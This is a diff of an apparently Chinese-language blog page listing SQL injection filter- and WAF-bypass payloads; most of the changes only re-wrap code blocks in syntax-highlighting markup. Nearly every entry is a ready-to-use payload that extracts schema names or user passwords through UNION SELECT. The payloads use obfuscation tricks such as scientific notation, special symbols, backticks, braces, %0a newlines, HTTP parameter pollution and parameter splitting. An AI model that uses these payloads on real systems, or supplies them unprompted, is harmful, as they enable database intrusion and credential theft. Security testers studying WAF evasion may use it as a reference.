@@ -183,36 +183,41 @@ html编码">
 </li>
 <li><p>特殊符号绕过</p>
 <ul>
-<li><p>科学记数法<br>id=0e1union select user 1e1from mysql.user</p>
+<li>科学记数法<br>id=0e1union select user 1e1from mysql.user</li>
+</ul>
 </li>
 <li><p><code>+</code></p>
-<pre><code>   id=0e1union(select+1,(select schema_name from information_schema.schemata limit 1))</code></pre>
+<pre><code>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0e1union(<span class="keyword">select</span>+<span class="number">1</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">1</span>))</span><br></pre></td></tr></table></figure></code></pre>
 </li>
 <li><p><code>-</code></p>
-<pre><code>id=0e1union(select-1,(select schema_name from information_schema.schemata limit 1))</code></pre>
+   <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0e1union(<span class="keyword">select</span><span class="number">-1</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">1</span>))</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>`反引号`</p>
-<pre><code>id=0e1union(select 1,(select `schema_name` from information_schema.schemata limit 1))</code></pre>
+   <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0e1union(<span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="string">`schema_name`</span> <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">1</span>))</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>~</p>
-<pre><code>id=0e1union(select~1,(select schema_name from information_schema.schemata limit 1))</code></pre>
-</li>
+   <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0e1union(<span class="keyword">select</span>~<span class="number">1</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">1</span>))</span><br></pre></td></tr></table></figure>
+
+<ul>
 <li><p>!</p>
-<pre><code>id=0e1union(select!1,(select schema_name from information_schema.schemata limit 1))</code></pre>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0e1union(<span class="keyword">select</span>!<span class="number">1</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">1</span>))</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>@<code>content</code></p>
-<pre><code>id=0e1union(select@`id`,(select schema_name from information_schema.schemata limit 1))</code></pre>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0e1union(<span class="keyword">select</span>@<span class="string">`id`</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">1</span>))</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
 </li>
 <li><p>.1</p>
-<p> id=.1union/<em>.1</em>/select password from users</p>
+<pre><code><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=.1union<span class="comment">/*.1*/</span><span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br></pre></td></tr></table></figure></code></pre>
 </li>
+</ul>
+<ul>
 <li><p>单引号、双引号</p>
-<pre><code>id=.1union/*.1*/select&#39;1&#39;,password from users
-id=.1union/*.1*/select&quot;1&quot;,password from users</code></pre>
+   <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=.1union<span class="comment">/*.1*/</span><span class="keyword">select</span><span class="string">&#x27;1&#x27;</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br><span class="line">   <span class="keyword">id</span>=<span class="number">.1</span><span class="keyword">union</span><span class="comment">/*.1*/</span><span class="keyword">select</span><span class="string">&quot;1&quot;</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br></pre></td></tr></table></figure>
 </li>
 <li><p>括号</p>
-<pre><code>id=0e1union(select!1,(select(schema_name)from information_schema.schemata limit 1))</code></pre>
-</li>
+<pre><code>   id=0e1union(select!1,(select(schema_name)from information_schema.schemata limit 1))</code></pre>
+<ul>
 <li><p>花括号</p>
 <pre><code>id=1 union(select%0aall&#123;x users&#125;from&#123;x ddd&#125;)
 id=1 union(select%0adistinct&#123;x users&#125;from&#123;x ddd&#125;)
@@ -241,11 +246,12 @@ id=1 union/*!50000select%0adistinctrow*/username from users%23</code></pre>
 </li>
 <li><p>HPP</p>
 <ul>
-<li><p>/?id=1/*<em>/union/</em>&amp;id=<em>/select/</em>&amp;id=<em>/pwd/</em>&amp;id=<em>/from/</em>&amp;id=*/users</p>
-<pre><code>重复出现同一个参数，容器不同，结果不同。</code></pre>
-</li>
+<li>/?id=1/*<em>/union/</em>&amp;id=<em>/select/</em>&amp;id=<em>/pwd/</em>&amp;id=<em>/from/</em>&amp;id=*/users</li>
 </ul>
 </li>
+</ul>
+<pre><code>     重复出现同一个参数，容器不同，结果不同。</code></pre>
+<ul>
 <li><p>HTTP 参数分割，不同的参数之间进行语句分割结果到了数据库执行查询时再合并语句</p>
 <p> <code>/?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--</code></p>
 </li>
